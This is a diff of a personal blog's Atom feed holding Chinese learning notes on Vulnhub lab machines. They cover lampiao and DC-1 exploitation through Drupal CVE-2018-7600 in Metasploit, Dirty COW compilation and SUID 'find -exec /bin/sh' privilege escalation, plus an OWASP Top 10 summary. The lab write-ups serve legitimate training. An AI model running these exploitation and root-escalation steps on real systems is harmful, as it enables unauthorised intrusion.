+    <content type="html"><![CDATA[<h5 id="lampiao渗透（Drupal-脏牛提权）"><a href="#lampiao渗透（Drupal-脏牛提权）" class="headerlink" title="lampiao渗透（Drupal+脏牛提权）"></a><a href="https://www.cnblogs.com/kuaile1314/p/11684518.html" target="_blank" rel="noopener">lampiao渗透（Drupal+脏牛提权）</a></h5><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>arp-scan -l 扫描同网段；</p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200313155952.png" alt=""></p><p>改变NAT模式使用arp-scan +nmap </p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200313161332.png" alt=""></p><p>发现目标主机，linux；开放22/80，ssh链接和80端口访问都可以尝试；</p><p>访问</p><p>访问无果，发现1898端口，又是drupal，想起上一个靶机，直接用msf操作一下试试；</p><p>和上一个一样，在网站更新文件里找到版本是drupal7.54</p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200318202258.png" alt=""></p><h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><p>就是说，用msf工作台的search drupal的2018.3.28的漏洞可以拿到shell；</p><p>设置 rhost,rport,target后run</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/sh")'</span></span><br></pre></td></tr></table></figure><p>创建一个python的原生终端；</p><p>后面查看系统版本，然后用searchsploit，找到可以用的exp</p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200318234518.png" alt=""></p><p>麻烦在不会用这个exp，脏牛，</p><p>上面是提权后的，实际上是在shell里下载；</p><p>wget 脏牛之后，不是cpp文件，原exp是cpp的后缀；</p><p>所以mv改名；</p><p>之后</p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200319000124.png" alt=""></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++<span class="number">11</span> -pthread -o dcow <span class="number">40847.</span>cpp -lutil</span><br><span class="line">./dcow -s</span><br><span class="line">达成提权目的，获得root权限；</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li>依旧是基于drupal的一个框架，网站目录里更新日志以及setting.php里会有信息，</li><li>其实主要还是2018.3.28日的那个漏洞</li><li>还有用到的cewl来爬去爆破字典</li><li>之前的弱口令密码爆破要再看看</li></ul>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/kuaile1314/p/11684518.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;lampiao渗透（Drupal+脏牛提权）&lt;/a&gt;&lt;/p&gt;
-
+        &lt;h5 id=&quot;lampiao渗透（Drupal-脏牛提权）&quot;&gt;&lt;a href=&quot;#lampiao渗透（Drupal-脏牛提权）&quot; class=&quot;headerlink&quot; title=&quot;lampiao渗透（Drupal+脏牛提权）&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www
       
     
     </summary>
@@ -139,412 +508,6 @@
       <category term="Drupal" scheme="http://yoursite.com/tags/Drupal/"/>
     
       <category term="flask" scheme="http://yoursite.com/tags/flask/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>3.5-kali下 ftp+ssh链接靶机</title>
-    <link href="http://yoursite.com/2020/03/05/3-5-kali%E4%B8%8B-ftp-ssh%E9%93%BE%E6%8E%A5%E9%9D%B6%E6%9C%BA/"/>
-    <id>http://yoursite.com/2020/03/05/3-5-kali%E4%B8%8B-ftp-ssh%E9%93%BE%E6%8E%A5%E9%9D%B6%E6%9C%BA/</id>
-    <published>2020-03-05T11:43:27.000Z</published>
-    <updated>2020-03-05T13:03:01.879Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="SSH远程登录kali"><a href="#SSH远程登录kali" class="headerlink" title="SSH远程登录kali"></a>SSH远程登录kali</h4><h5 id="1-win7下登录"><a href="#1-win7下登录" class="headerlink" title="1.win7下登录"></a>1.win7下登录</h5><p>​    使用PuTTY远程登录；</p><p>[img]<a href="https://s2.ax1x.com/2020/03/05/3H8t4f.png[/img]" target="_blank" rel="noopener">https://s2.ax1x.com/2020/03/05/3H8t4f.png[/img]</a></p><h5 id="2-linux下"><a href="#2-linux下" class="headerlink" title="2.linux下"></a>2.linux下</h5><p>​    ssh username@sshserver</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h4 id=&quot;SSH远程登录kali&quot;&gt;&lt;a href=&quot;#SSH远程登录kali&quot; class=&quot;headerlink&quot; title=&quot;SSH远程登录kali&quot;&gt;&lt;/a&gt;SSH远程登录kali&lt;/h4&gt;&lt;h5 id=&quot;1-win7下登录&quot;&gt;&lt;a href=&quot;#1-win7下登
-      
-    
-    </summary>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
-    
-      <category term="ssh" scheme="http://yoursite.com/tags/ssh/"/>
-    
-      <category term="ftp" scheme="http://yoursite.com/tags/ftp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>3.5-linux下提权技巧</title>
-    <link href="http://yoursite.com/2020/03/05/3-5-linux%E4%B8%8B%E6%8F%90%E6%9D%83%E6%8A%80%E5%B7%A7/"/>
-    <id>http://yoursite.com/2020/03/05/3-5-linux%E4%B8%8B%E6%8F%90%E6%9D%83%E6%8A%80%E5%B7%A7/</id>
-    <published>2020-03-05T08:44:38.000Z</published>
-    <updated>2020-03-05T14:48:56.340Z</updated>
-    
-    <content type="html"><![CDATA[<p>​    <a href="https://blog.csdn.net/yaofeino1/article/details/62897259" target="_blank" rel="noopener">https://blog.csdn.net/yaofeino1/article/details/62897259</a></p><p>​    对于已经安装了python的系统，我们可以使用 python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty; pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure><p>​    交互式，很好用；</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;​    &lt;a href=&quot;https://blog.csdn.net/yaofeino1/article/details/62897259&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/yaofeino1/ar
-      
-    
-    </summary>
-    
-    
-      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>OWSAP TOP 10总结</title>
-    <link href="http://yoursite.com/2020/03/05/3.5-OWSAP-TOP-10/"/>
-    <id>http://yoursite.com/2020/03/05/3.5-OWSAP-TOP-10/</id>
-    <published>2020-03-04T16:47:44.000Z</published>
-    <updated>2020-03-05T16:41:05.841Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="TOP1-注入"><a href="#TOP1-注入" class="headerlink" title="TOP1 注入"></a>TOP1 注入</h3><p>​    当将不受信任的数据作为命令或查询的一部分发送到解释器时，会出现诸如SQL，NoSQL，OS和LDAP注入之类的注入漏洞。攻击者的敌对数据可能会诱使解释器执行未经预期的命令或未经适当授权而访问数据。</p><p>​    注入接触最多的是SQL注入，之前安恒杯月赛还接触了 flask相关的ssti注入；</p><h3 id="TOP2-Broken-Authentication（失效的身份认证和会话管理）"><a href="#TOP2-Broken-Authentication（失效的身份认证和会话管理）" class="headerlink" title="TOP2 Broken Authentication（失效的身份认证和会话管理）"></a>TOP2 Broken Authentication（<strong>失效的身份认证和会话管理</strong>）</h3><p>​    与认证和会话管理相关的应用程序功能往往得不到正确实施，导致了攻击者可以破坏密码，密钥，会话令牌或实施漏洞冒充其他用户身份。<br>危害如下：<br>​    这些漏洞可能导致部分甚至全部账户遭受攻击，一旦攻击成功，攻击者就能执行合法的任何操作<br>如何防范：<br>1.使用内置的会话管理功能<br>2.通过认证的问候<br>3.使用单一的入口点<br>4.确保在一开始登录SSL保护的网页</p><h3 id="TOP3-XSS（跨站脚本攻击）"><a href="#TOP3-XSS（跨站脚本攻击）" class="headerlink" title="TOP3-XSS（跨站脚本攻击）"></a>TOP3-XSS（跨站脚本攻击）</h3><p>  跨站脚本是经常出现在web应用中的安全漏洞，其允许恶意web用户将代码植入到提供给其他用户使用的页面中，这些代码包括HTML代码和客户端脚本。黑客界公识是xss是新型的“缓冲区溢出攻击”</p><p>种类：<br>存储型，反射型，DOM型<br>如何防范：<br>1.验证输入<br>2.编码输出（用来确保输入的字符被视为数据，而不是作为html被浏览器所解析）</p><p> 感觉XEE也属于XSS；</p><h3 id="TOP4-不安全的对象直接引用"><a href="#TOP4-不安全的对象直接引用" class="headerlink" title="TOP4-不安全的对象直接引用"></a>TOP4-不安全的对象直接引用</h3><p>  一个已经授权的用户通过更改访问时的一个参数，从而访问到原本其并没有得到授权的对象。</p><p>如何防范：<br>1.使用基于用户或会话的间接对象访问，这样可防止攻击者直接攻击为授权资源<br>2.访问检查：对任何来自不受信源所使用的所有对象进行访问控制检查<br>3.避免在url或网页中直接引用内部文件名或数据库关键字<br>4.验证用户输入和url请求，拒绝包含./ ../的请求</p><p>  感觉linux下suid提权是这方面的，</p><h3 id="TOP5-跨站请求伪造（CSRF）"><a href="#TOP5-跨站请求伪造（CSRF）" class="headerlink" title="TOP5-跨站请求伪造（CSRF）"></a>TOP5-跨站请求伪造（CSRF）</h3><p>​    跨站请求伪造，攻击者通过用户的浏览器注入额外的网络请求，破坏网络会话的完整性。浏览器的安全策略是允许当前界面发送到任何地址，因此也意味着如果用户浏览了自己无法控制的资源时，攻击者可以通过控制页面的内容来控制浏览器，发送其精心构造的请求，这些精心构造的请求很难和合法的请求区分开。</p><p>如何防范：<br>1.给每个HTTP请求添加一个不可预测的令牌，并保证该令牌对每个用户会话来说是唯一的。<br>最好的办法就是将独有的令牌包含在隐藏字段中，通过HTTP请求发送，避免在URL中暴露出来。<br>2.要求用户重新认证或判断他们是一个真实的用户。</p><h3 id="TOP6-安全配置错误"><a href="#TOP6-安全配置错误" class="headerlink" title="TOP6-安全配置错误"></a>TOP6-安全配置错误</h3><p>​    安全配置错误可以发生在一个应用程序堆栈的任何层面，包括平台，web服务器，应用服务器，数据库，架构和自定义的代码。攻击者通过访问默认账户，未使用的网页，未安装的补丁的漏洞，未被保护的文件和目录等，以获得对系统为授权的访问。</p><p> 危害如下；</p><p> 系统可能在未知的情况下被完全攻破，用户数据可能随着时间被全部盗走或篡改。甚至导致整个系统被完全破坏</p><p>如何防范：<br>1.自动化安装部署<br>2.及时了解并部署每个环节的软件更新和补丁信息<br>3.实施漏洞扫描和安全审计</p><p> 和利用drupal 漏洞获得远程权限很相似；</p><h3 id="TOP7-限制URL访问失败（缺少功能级访问控制）"><a href="#TOP7-限制URL访问失败（缺少功能级访问控制）" class="headerlink" title="TOP7-限制URL访问失败（缺少功能级访问控制）"></a>TOP7-限制URL访问失败（缺少功能级访问控制）</h3><p>​    这个漏洞也是与认证相关的，这种漏洞具体是指在系统已经对url的访问做了限制的情况下，但这种限制并没有生效。常见的例子是系统没有对用户进行角色的检查，以及用户通过修改URL的action并指向未被授权页面就能访问该页面同样是个漏洞<br>危害如下：<br>​    攻击者很容易就能把网址改成享有特权的网页，这样就可以使用匿名或普通用户访问未授保护的私人页面，从而提升未授权功能和相关数据信息</p><p>如何防范：<br>1.检查管理权限的过程并确保能够容易进行升级和审计<br>2.默认缺省情况下，应该拒绝所有访问的执行权限。对于每个功能得访问，需要明确的角色授权<br>3.检查每个功能分配的权限合理有效</p><h3 id="TOP8-未验证的重定向和转发"><a href="#TOP8-未验证的重定向和转发" class="headerlink" title="TOP8-未验证的重定向和转发"></a>TOP8-未验证的重定向和转发</h3><p>​    在Web应用中重定向是极为普通的，并且通常重定向所引发的目的是带有用户输入参数的目的url，而如果这些重定向未被验证，那么攻击者就可以引导用户访问他们想要用户访问的站点。<br>​    同样，转发也是极为普遍的，本质上转发是在同一个应用中对一个新页面发送请求，并且有时是用参数来定义目标页面的。同样，如果参数未被验证，那么攻击者就可以利用其来绕过认证或是授权检查<br>危害如下：<br>攻击者通过重定向可以试图安装恶意软件或诱使受害人泄露密码等铭感信息，通过转发可以绕过访问限制<br>如何防范：<br>1.避免使用重定向和转发<br>2.如果使用了，不要在确定目标时涉及到用户参数<br>3.如果无法避免使用用户参数，则应确保目标参数值对于当前用户是有效的并已授权<br>如果是需要登录的，可以从session当中获取登录信息，然后判断</p><h3 id="TOP9-应用已知漏洞的组件"><a href="#TOP9-应用已知漏洞的组件" class="headerlink" title="TOP9-应用已知漏洞的组件"></a>TOP9-应用已知漏洞的组件</h3><p>​    组件（例如库，框架和其他软件模块）以与应用程序相同的权限运行。如果利用易受攻击的组件，这种攻击可能会导致严重的数据丢失或服务器接管。使用具有已知漏洞的组件的应用程序和API可能会破坏应用程序防御并实现各种攻击和破坏。<br>如何防范：<br>1.识别正在使用的组件和版本，包括所有的依赖<br>2.更新组件或引用的库文件到最新<br>3.建立安全策略来管理组件的使用</p><h3 id="TOP10-敏感信息暴露"><a href="#TOP10-敏感信息暴露" class="headerlink" title="TOP10-敏感信息暴露"></a>TOP10-敏感信息暴露</h3><p>​    由于代码编写不严谨或应用固有的功能，造成网站服务器信息被非法获取，属于一种低危漏洞。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;TOP1-注入&quot;&gt;&lt;a href=&quot;#TOP1-注入&quot; class=&quot;headerlink&quot; title=&quot;TOP1 注入&quot;&gt;&lt;/a&gt;TOP1 注入&lt;/h3&gt;&lt;p&gt;​    当将不受信任的数据作为命令或查询的一部分发送到解释器时，会出现诸如SQL，NoSQL，OS
-      
-    
-    </summary>
-    
-    
-      <category term="note" scheme="http://yoursite.com/categories/note/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>kali下对靶机DC-1的实战渗透测试</title>
-    <link href="http://yoursite.com/2020/03/05/3.5-kali%E4%B8%8B%E5%AF%B9%E9%9D%B6%E6%9C%BA%E7%9A%84%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    <id>http://yoursite.com/2020/03/05/3.5-kali%E4%B8%8B%E5%AF%B9%E9%9D%B6%E6%9C%BA%E7%9A%84%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
-    <published>2020-03-04T16:46:21.000Z</published>
-    <updated>2020-03-06T08:15:18.721Z</updated>
-    
-    <content type="html"><![CDATA[<p>​            <strong>记录渗透测试靶机练习-DC-1</strong></p><p>​    靶机来源vulnhub;</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//www.vulnhub.com/?page=1</span></span><br></pre></td></tr></table></figure><p>DC-1</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">描述</span><br><span class="line">DC-<span class="number">1</span>是一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">它的设计初学者是一个挑战，但是它的难易程度取决于您的技能和知识以及学习能力。</span><br><span class="line"></span><br><span class="line">要成功完成此挑战，您需要具备Linux技能，熟悉Linux命令行以及具有基本渗透测试工具的经验，例如可以在Kali Linux或Parrot Security OS上找到的工具。</span><br><span class="line"></span><br><span class="line">有多种获<span class="built_in">得root</span>的方法，但是，我包括了一些标志，这些标志包含了初学者的线索。</span><br><span class="line"></span><br><span class="line">总共有五个标志，但是最终目标是<span class="built_in">在root</span>的主目录中找到并读取该标志。您甚至不需要成<span class="built_in">为root</span>用户即可执行此操作，但是，您将需<span class="built_in">要root</span>特权。</span><br><span class="line"></span><br><span class="line">根据您的技能水平，您可能可以跳过查找大多数这些标志并直接获<span class="built_in">得root</span>资格。</span><br><span class="line"></span><br><span class="line">初学者可能会遇到以前从未遇到过的挑战，但是Google搜索应该是获得完成此挑战所需信息所需要的全部。</span><br></pre></td></tr></table></figure><h4 id="开始："><a href="#开始：" class="headerlink" title="开始："></a>开始：</h4><p>​    靶机页面：</p><p><a href="https://imgchr.com/i/37lLfe" target="_blank" rel="noopener"><img src="/images/37lLfe.png" alt="37lLfe.png"></a></p><p>有一些操作系统的信息，Debian GNU/Linux 7,显示需要登录，那可能就需要后续密码的爆破；linux的系统密码在之前有温习过；</p><h4 id="嗅探："><a href="#嗅探：" class="headerlink" title="嗅探："></a>嗅探：</h4><p>其实相当于内网渗透，目标主机于本机位于同一个局域网下，用arp-scan探测</p><p><a href="https://imgchr.com/i/378LfU" target="_blank" rel="noopener"><img src="/images/378LfU.png" alt="378LfU.png"></a></p><p>目标IP：192.168.0.108；</p><p>信息收集其实算跳过了，因为直接到的内网渗透；</p><h4 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h4><p><a href="https://imgchr.com/i/37aQNn" target="_blank" rel="noopener"><img src="/images/37aQNn.png" alt="37aQNn.png"></a></p><p>这个只扫了有限的端口；</p><p><a href="https://imgchr.com/i/37asgK" target="_blank" rel="noopener"><img src="/images/37asgK.png" alt="37asgK.png"></a></p><p>-p- 命令扫描0-65535个</p><p>看到有22/80端口开放；</p><p>访问192.168.0.108:80</p><p><a href="https://imgchr.com/i/37w2tA" target="_blank" rel="noopener"><img src="/images/37w2tA.png" alt="37w2tA.png"></a><br>看得到Drupal site，框架是Drupal；</p><p>想想看msf对这个框架有没有方法，search一下</p><p><a href="https://imgchr.com/i/37wfpt" target="_blank" rel="noopener"><img src="/images/37wfpt-1583394228188.png" alt="37wfpt.png"></a></p><p>选取一个等级为excellent的使用；</p><p>show options设置rhost 192.168.0.108</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里<span class="number">2018</span><span class="number">-3</span><span class="number">-28</span>的漏洞是Drupal 在<span class="number">3</span>月<span class="number">28</span>日爆出的一个远程代码执行漏洞，CVE编号CVE<span class="number">-2018</span><span class="number">-7600</span>。</span><br></pre></td></tr></table></figure><p>exploit;</p><p>会自动建立session,输入shell后可以对目标靶机操作</p><p>所在的目录是网站的绝对路径 <code>/var/www</code></p><p><a href="https://imgchr.com/i/37yvcR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/05/37yvcR.png" alt="37yvcR.png"></a></p><h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><p>ls查看</p><p><a href="https://imgchr.com/i/376ZjI" target="_blank" rel="noopener"><img src="/images/376ZjI.md.png" alt="376ZjI.md.png"></a></p><p>发现 flag1.txt;</p><p><img src="/images/376yvR.png" alt="376yvR.png"></p><p>提醒查看config file，也就是配置文件；</p><p>drupal默认配置文件是在sites/default/setting.php下</p><p>打卡；</p><p><a href="https://imgchr.com/i/372Sun" target="_blank" rel="noopener"><img src="/images/372Sun.png" alt="372Sun.png"></a></p><p>是网站数据库的内容，有数据库用户名等信息，接下来应该是要到网站数据库中找线索；</p><p>这里之后本来是卡住了的，看了有两个思路，</p><p>1.是获取linux下的用户名，hydra+john the Ripper爆破，爆破后使用ssh远程连接登录，权限够进入mysql查看用户，再修改密码的sha512值，然后发现还是要提权，提权后发现flag；</p><p>2.然后另一个就是用python写shell交互命令，然后直接登录MySQL重置密码获得提示，再之后进入用户页面找机会提权；</p><p>绕不过的提权，学习目录上加上一个linux提权；</p><h4 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h4><p><a href="https://imgchr.com/i/37ToR0" target="_blank" rel="noopener"><img src="/images/37ToR0.th.png" alt="37ToR0.th.png"></a></p><p>这里要提一下linux下的drupal用户和密码加密</p><p><a href="https://www.isfirst.net/drupal/drupal-reset-password" target="_blank" rel="noopener">https://www.isfirst.net/drupal/drupal-reset-password</a></p><p>之后就又获得一个tips，通过 -exec 命令来获得密码一类；</p><p><img src="/images/3777tA.png" alt="3777tA.png"></p><p>其实perm 是linux下find命令的一个参数，例如，</p><p>find -perm，即根据文件权限查找文件；</p><p>综合之下就是用find + exec；</p><p>这里两种思路汇聚，前面第一种是ssh远程爆破flag4密码登录，另一种使用python交互shell找到/home/flag4文件夹下；</p><p>之后就都是利用find进行提权；</p><p><img src="/images/3HpM6J.png" alt="3HpM6J.png"></p><p>这里cat 命令显示权限不够，于是准备提权；</p><p><strong>SUID提权</strong>：<a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84872644</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> flag4.txt -exec <span class="string">"whoami"</span> \;</span><br><span class="line">用 -exec 查看文件权限；</span><br><span class="line"><span class="builtin-name">find</span> flag4.txt -exec <span class="string">"/bin/sh"</span> \;</span><br><span class="line"><span class="comment"># 这段命令的意思就是先使用 find 命令查找 flag4.txt 文件，然后使用它的参数 -exec 来执行命令 /bin/sh ，这样我们就能获取到 root 权限了！</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/3HP7Nt" target="_blank" rel="noopener"><img src="/images/3HP7Nt.png" alt="3HP7Nt.png"></a></p><p>到这就结束了；</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​    难点其实不在嗅探探查的过程，因为是靶机的原因，直接内网探测，框架的以及tips都给了，利用nmap、msf都是利用工具的过程，后面在Linux里的提权还有找线索的过程对我很难，证明linux还是要好好学，还有提权，当然，没有前面的漏洞也没有办法右后面的提权；</p><ul><li>arp-scan、nmap扫描工具的使用</li><li>Drupal框架的了解以及MSF操作台对其漏洞的使用</li><li>hydra+john the Ripper的弱口令密码爆破</li><li>爆破后使用ssh远程连接登录</li><li>find命令结合-exec参数的使用</li><li>linux下suid的提权</li><li>Drupal忘记管理密码重置管理密码的四种方法</li></ul><p>参考链接：</p><p><a href="http://liuwx.cn/Vulnhub-DC-1.html" target="_blank" rel="noopener">http://liuwx.cn/Vulnhub-DC-1.html</a></p><p><a href="https://www.isfirst.net/drupal/drupal-reset-password" target="_blank" rel="noopener">https://www.isfirst.net/drupal/drupal-reset-password</a></p><p><a href="https://blog.csdn.net/qq_41954384/article/details/92164443" target="_blank" rel="noopener">https://blog.csdn.net/qq_41954384/article/details/92164443</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;​            &lt;strong&gt;记录渗透测试靶机练习-DC-1&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;​    靶机来源vulnhub;&lt;/p&gt;
-&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
-      
-    
-    </summary>
-    
-    
-      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
-    
-      <category term="渗透测试实战" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98/"/>
-    
-      <category term="靶机" scheme="http://yoursite.com/tags/%E9%9D%B6%E6%9C%BA/"/>
-    
-      <category term="CVE-2018-7600" scheme="http://yoursite.com/tags/CVE-2018-7600/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>3.4-kali下嗅探工具ettercap</title>
-    <link href="http://yoursite.com/2020/03/04/3.4-kali%E4%B8%8B%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7ettercap/"/>
-    <id>http://yoursite.com/2020/03/04/3.4-kali%E4%B8%8B%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7ettercap/</id>
-    <published>2020-03-04T14:20:22.000Z</published>
-    <updated>2020-03-05T12:14:39.854Z</updated>
-    
-    <summary type="html">
-    
-    </summary>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
-    
-      <category term="ettercap" scheme="http://yoursite.com/tags/ettercap/"/>
-    
-      <category term="嗅探工具" scheme="http://yoursite.com/tags/%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>3.4-kali下密码爆破工具john</title>
-    <link href="http://yoursite.com/2020/03/04/3.4-kali%E4%B8%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7john/"/>
-    <id>http://yoursite.com/2020/03/04/3.4-kali%E4%B8%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7john/</id>
-    <published>2020-03-04T13:01:42.000Z</published>
-    <updated>2020-03-05T11:55:44.440Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/boy_from_village/article/details/80383419" target="_blank" rel="noopener">https://blog.csdn.net/boy_from_village/article/details/80383419</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/boy_from_village/article/details/80383419&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/boy_from_v
-      
-    
-    </summary>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
-    
-      <category term="密码爆破" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>kali工具 arp-scan 使用</title>
-    <link href="http://yoursite.com/2020/03/04/3.4-kali%E5%B7%A5%E5%85%B7-arp-scan-%E4%BD%BF%E7%94%A8/"/>
-    <id>http://yoursite.com/2020/03/04/3.4-kali%E5%B7%A5%E5%85%B7-arp-scan-%E4%BD%BF%E7%94%A8/</id>
-    <published>2020-03-04T11:23:11.000Z</published>
-    <updated>2020-03-05T12:05:16.561Z</updated>
-    
-    <content type="html"><![CDATA[<p>​    kali自带的一款轻量<strong>ARP扫描工具</strong>，该工具会自动解析MAC地址，得到对应硬件厂商。</p><h4 id="1-ARP"><a href="#1-ARP" class="headerlink" title="1.ARP"></a>1.ARP</h4><p>​    地址解析协议（Address Resolution Protocol），根据IP地址获得物理地址MAC的一个TCP/IP协议。</p><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><a href="https://blog.csdn.net/weixin_43221560/article/details/90550294" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43221560/article/details/90550294</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;​    kali自带的一款轻量&lt;strong&gt;ARP扫描工具&lt;/strong&gt;，该工具会自动解析MAC地址，得到对应硬件厂商。&lt;/p&gt;
-&lt;h4 id=&quot;1-ARP&quot;&gt;&lt;a href=&quot;#1-ARP&quot; class=&quot;headerlink&quot; title=&quot;1.ARP&quot;&gt;&lt;/a
-      
-    
-    </summary>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
-    
-    
-      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
-    
-      <category term="嗅探工具" scheme="http://yoursite.com/tags/%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7/"/>
-    
-      <category term="arp-scan" scheme="http://yoursite.com/tags/arp-scan/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>php代码审计</title>
-    <link href="http://yoursite.com/2020/03/01/3.1-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    <id>http://yoursite.com/2020/03/01/3.1-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
-    <published>2020-03-01T09:21:58.000Z</published>
-    <updated>2020-03-05T08:08:17.421Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h1><h4 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h4><p>模型，视图，控制器；Model,View,Controller(用户交互);</p><p><img src="/images/3.1-1.png" alt="3.1-1"></p><a id="more"></a><h4 id="常见PHP框架："><a href="#常见PHP框架：" class="headerlink" title="常见PHP框架："></a>常见PHP框架：</h4><p>ThinkPhP，Yaf,laravel,Kohana,Codelgniter,Yii,Snyfony,doitphp;</p><h4 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h4><p><img src="/images/3.1-2.png" alt="3.1-2"></p><h5 id="通读全文："><a href="#通读全文：" class="headerlink" title="通读全文："></a>通读全文：</h5><ul><li><p>函数集文件</p></li><li><p>配置文件</p></li><li><p>安全过滤文件</p></li><li><p>Index文件</p></li></ul><p><img src="/images/3.1-3.png" alt="3.1-3"></p><h5 id="功能点定向审计"><a href="#功能点定向审计" class="headerlink" title="功能点定向审计"></a>功能点定向审计</h5><p>参考网址：<a 